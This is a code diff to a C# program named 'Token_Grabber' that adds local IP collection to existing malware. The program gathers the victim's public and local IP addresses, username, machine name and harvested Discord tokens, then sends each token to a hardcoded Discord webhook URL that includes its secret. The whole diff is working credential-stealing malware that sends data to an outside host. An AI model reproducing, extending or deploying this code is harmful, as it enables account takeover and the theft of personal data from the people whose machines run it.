@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Collections.Specialized;
 using System.Linq;
 using System.Net;
+using System.Net.Sockets;
 using System.Text;
 using System.Threading.Tasks;
 
@@ -11,9 +12,23 @@ namespace Token_Grabber
     public class PrintAllInfo
     {
         public static string weblink = ("https://api.ipify.org/");
+        public static string? internalip;
         public PrintAllInfo()
         {
             SendInfo();
+        }
+
+
+        public static void GetLocalIPAddress()
+        {
+            var host = Dns.GetHostEntry(Dns.GetHostName());
+            foreach (var ip in host.AddressList)
+            {
+                if (ip.AddressFamily == AddressFamily.InterNetwork)
+                {
+                    internalip = ip.ToString();
+                }
+            }
         }
 
         /// <summary>
@@ -21,21 +36,23 @@ namespace Token_Grabber
         /// </summary>
         static void SendInfo()
         {
+            GetLocalIPAddress();
             //Discord webhook url
             string url = "https://discord.com/api/webhooks/959071811419652096/dOkV-5nK6JXpqa-86ODdZfbkAaV9UhJ9fzlLf3Ta-35SmGYjkY_XZCxGsYdAfbERDZUT";
-            string json = "{\"username\": \"Discord Token Grabber\",\"embeds\":[ {\"description\": \" \\n \\n \\n \\n\\n\", \"title\":\"Info:\", \"color\":1018364}] }";
+            string json = "{\"username\": \"Discord Token Grabber\",\"embeds\":[ {\"description\": \"\\n \\n \\n \\n \\n\", \"title\":\"Info:\", \"color\":1018364}] }";
 
-            string newjson = json.Insert(65, $"{GetIp()}");
-            newjson = newjson.Insert(68 + GetIp().Length, $"{Environment.UserName}");
-            newjson = newjson.Insert(71 + Environment.UserName.Length + GetIp().Length, $"{Environment.MachineName}");
+            string newjson = json.Insert(65, $"Public IP: {GetIp()}");
+            newjson = newjson.Insert(79 + GetIp().Length, $"Local IP: {internalip}");
+            newjson = newjson.Insert(92 + GetIp().Length + internalip.Length, $"Username: {Environment.UserName}");
+            newjson = newjson.Insert(105 + Environment.UserName.Length + GetIp().Length + internalip.Length, $"PC Name: {Environment.MachineName}");
 
 
             //Filters through possible tokens
-            foreach(string item in DiscordToken.matchs)
+            foreach (string item in DiscordToken.matchs)
             {
                 try
                 {
-                    string virtualjson = newjson.Insert(77 + GetIp().Length + Environment.UserName.Length + Environment.MachineName.Length, $"{item}");
+                    string virtualjson = newjson.Insert(117 + GetIp().Length + Environment.UserName.Length + Environment.MachineName.Length + internalip.Length, $"\\n Token: {item}");
                     SendDiscordWebhook(url, virtualjson);
                 }
                 catch { }
